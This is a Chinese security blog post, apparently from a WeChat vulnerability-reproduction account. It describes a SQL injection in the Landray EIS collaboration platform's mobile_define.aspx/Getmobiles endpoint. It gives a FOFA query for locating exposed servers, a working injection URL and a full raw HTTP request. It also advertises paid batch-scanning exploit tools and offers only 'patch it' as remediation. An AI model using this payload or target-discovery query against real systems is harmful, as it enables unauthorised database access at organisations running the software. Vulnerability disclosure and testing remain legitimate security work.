#  蓝凌EIS智慧协同平台mobile_define.aspx/Getmobiles接口存在SQL注入漏洞 附POC  
2026-6-29更新
                    2026-6-29更新  南风漏洞复现文库   2026-06-28 23:33  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 蓝凌EIS智慧协同平台简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
蓝凌智慧协同平台eis集合了非常丰富的模块，满足组织企业在知识、协同、项目管理系统建设等需求  
## 2.漏洞描述  
  
蓝凌智慧协同平台eis集合了非常丰富的模块，满足组织企业在知识、协同、项目管理系统建设等需求。蓝凌EIS智慧协同平台mobile_define.aspx/Getmobiles接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
蓝凌EIS智慧协同平台  
![蓝凌EIS智慧协同平台mobile_define.aspx/Getmobiles接口存在SQL注入漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6xpFcMEiaTyez4Oa111OzMp6tcH9oaus1Jr7F0hE2mpAcCOKGl7Oan71E1x3BFXicZickvV09XnFbwm16Ndflpp9zhgxZWac7XuWI/640?wx_fmt=png&from=appmsg "null")  
  
蓝凌EIS智慧协同平台mobile_define.aspx/Getmobiles接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="/sc ripts/jquery.landray.common.js" || body="v11_QRcodeBar clr" || title="智慧协同平台"&& body="欢迎登录智慧协同平台"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/Mobile/mobile_define.aspx/Getmobiles?flow_id=1%20and%201=@@version--+  
  
漏洞数据包：  
```
GET /Mobile/mobile_define.aspx/Getmobiles?flow_id=1%20and%201=@@version--+ HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wuP8iaxLK4JtMcKGwdNJsgVdGbOTibrtibiakKpOsztI4ShCiakkI7icF3SR3O8ZnnratJribsXwkb4DTcBt2FksgQ4ef5Zf2eljIqVs/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6yMr53Q4tGuY7edtfOPZ1Y22C39nZ8r2j3TDbMibyz40mbibOqoYF4LlSqpw4zxmUncJicy9Wia4iao8xjLarjKLicTd3mrHpTXPpb24/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wcicyOcBSxeTBzDkR2iaiczQ8lICAbjiaBib2NWCQyXXraBOtZYokNUYksfrxFv3ibttib7wOEGhGDGWmYAheOxiaNVVibAqg0ptF4qPg8/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xv9A063gJPhm6UUMv3wWoLLtIxxootiaxic2FHKLcRR80ThaEttAELyxbZ1OGALppjzAIDjD8O7UibYI4d7Ifz4RicEu3AJcfY4Zw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6w3hVLdahvIchRnfnHWyEqmiaY6fgBlFAMTzpSnJDem0aReVbwiahlPoUmqoibUqYSTjSdESkf4jatrqswuUw2I4kNCd0luEJp3TI/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zrm626XMq3oDG9Yn0d57kJLcTcPvurmUCSfXM6IhssRyZmfeuaibUVNTibtazh9ciaSdULwaHh4XmRHjtc4WXg2985GzLARicotzo/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xErEVxCibQPv66kzuqy5bjvqpH0aS20FC9dL9LrqeRRPLQXnzoIiaa8CsP8Z84icv5vFcvqAMThYpfAJvhfZgKoiccDQMausYx0qQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
[LiteLLM存在远程命令执行漏洞CVE-2026-42271 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490626&idx=1&sn=3f97b8efebf755f4dff2377bb3acd43b&scene=21#wechat_redirect)  
  
  
  
  
